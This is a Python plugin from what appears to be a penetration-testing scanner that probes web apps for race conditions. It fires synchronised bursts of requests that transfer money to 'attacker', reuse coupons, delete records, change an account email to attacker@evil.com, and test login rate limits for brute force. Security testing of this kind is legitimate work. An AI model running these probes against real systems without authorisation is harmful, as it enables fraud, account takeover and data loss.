# plugins/race_condition.py — Cascavel 2026 Intelligence
import threading

import requests

# ──────────── RACE ENDPOINTS (2026 Expanded) ────────────
RACE_ENDPOINTS = [
    # Financial
    ("/api/transfer", "POST", {"amount": 1, "to": "attacker"}),
    ("/api/withdraw", "POST", {"amount": 1}),
    ("/api/v1/apply-coupon", "POST", {"code": "DISCOUNT50"}),
    ("/checkout/complete", "POST", {"cart_id": "1"}),
    ("/api/claim", "POST", {"reward_id": "1"}),
    ("/api/v1/bonus", "POST", {"type": "signup"}),
    # Voting/Likes
    ("/api/v1/vote", "POST", {"item_id": "1"}),
    ("/api/v1/like", "POST", {"post_id": "1"}),
    ("/api/v1/follow", "POST", {"user_id": "1"}),
    # Account
    ("/api/v1/redeem", "POST", {"code": "FREE_TRIAL"}),
    ("/api/v1/invite", "POST", {"email": "test@test.com"}),
    ("/api/change-email", "POST", {"email": "attacker@evil.com"}),
    # File operations
    ("/api/upload", "POST", {"file": "test.txt"}),
    ("/api/delete", "POST", {"id": "1"}),
]


def _send_request(url, method, payload, results, idx, session):
    """Envia uma requisição e armazena o resultado por índice."""
    try:
        if method == "POST":
            resp = session.post(url, json=payload, timeout=8)
        else:
            resp = session.get(url, timeout=8)
        results[idx] = {
            "status": resp.status_code,
            "length": len(resp.text),
            "body_preview": resp.text[:100],
        }
    except Exception as e:
        results[idx] = {"status": 0, "error": str(e)}


def _fire_concurrent(url, method, payload, count=15):
    """Dispara N requisições simultâneas ao mesmo endpoint."""
    results = [None] * count
    threads = []
    session = requests.Session()  # Connection pooling

    # Barrier sync - all threads start at the same time
    barrier = threading.Barrier(count)

    def _sync_send(idx):
        try:
            barrier.wait(timeout=5)
        except threading.BrokenBarrierError:
            pass
        _send_request(url, method, payload, results, idx, session)

    for i in range(count):
        t = threading.Thread(target=_sync_send, args=(i,))
        threads.append(t)
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=20)

    return [r for r in results if r is not None]


def _analyze_race(results, endpoint, method):
    """Analisa resultados de race condition para detectar TOCTOU."""
    success = [r for r in results if r.get("status") in [200, 201, 204]]
    if len(success) > 1:
        lengths = set(r.get("length", 0) for r in success)
        bodies = set(r.get("body_preview", "") for r in success)
        return {
            "tipo": "RACE_CONDITION_TOCTOU",
            "endpoint": endpoint,
            "metodo": method,
            "requisicoes_sucesso": len(success),
            "total": len(results),
            "respostas_diferentes": len(lengths) > 1 or len(bodies) > 1,
            "severidade": "CRITICO",
            "descricao": "Múltiplas requisições aceitas — possível double-spend/TOCTOU!",
        }
    return None


def _test_limit_overrun(target):
    """Testa limit overrun via race condition (e.g., rate limit bypass)."""
    vulns = []
    # Try to hit a rate-limited endpoint multiple times simultaneously
    rate_limited_endpoints = ["/api/login", "/api/auth", "/api/forgot-password"]
    for ep in rate_limited_endpoints:
        url = f"http://{target}{ep}"
        payload = {"email": "test@test.com", "password": "test"}
        results = _fire_concurrent(url, "POST", payload, count=20)
        rate_limited = [r for r in results if r.get("status") == 429]
        success = [r for r in results if r.get("status") in [200, 401, 403]]
        if len(success) >= 15 and len(rate_limited) == 0:
            vulns.append(
                {
                    "tipo": "RATE_LIMIT_BYPASS_RACE",
                    "endpoint": ep,
                    "requisicoes_aceitas": len(success),
                    "severidade": "ALTO",
                    "descricao": "20 requisições aceitas sem rate limiting — brute force possível!",
                }
            )
    return vulns


def run(target, ip, open_ports, banners):
    """
    Scanner Race Condition 2026-Grade — TOCTOU, Barrier Sync, Limit Overrun.

    Técnicas: 14 race endpoints (financial/voting/account/file),
    barrier-synchronized concurrent requests (15 threads),
    connection pooling (Session), TOCTOU detection,
    response diversity analysis, rate limit bypass via race,
    double-spend/coupon-reuse/vote-manipulation.
    """
    _ = (ip, open_ports, banners)
    vulns = []

    for endpoint, method, payload in RACE_ENDPOINTS:
        url = f"http://{target}{endpoint}"
        results = _fire_concurrent(url, method, payload, count=15)
        vuln = _analyze_race(results, endpoint, method)
        if vuln:
            vulns.append(vuln)

    vulns.extend(_test_limit_overrun(target))

    return {
        "plugin": "race_condition",
        "versao": "2026.1",
        "tecnicas": ["toctou", "barrier_sync", "connection_pool", "limit_overrun", "response_diversity"],
        "resultados": vulns if vulns else "Nenhuma race condition detectada",
    }
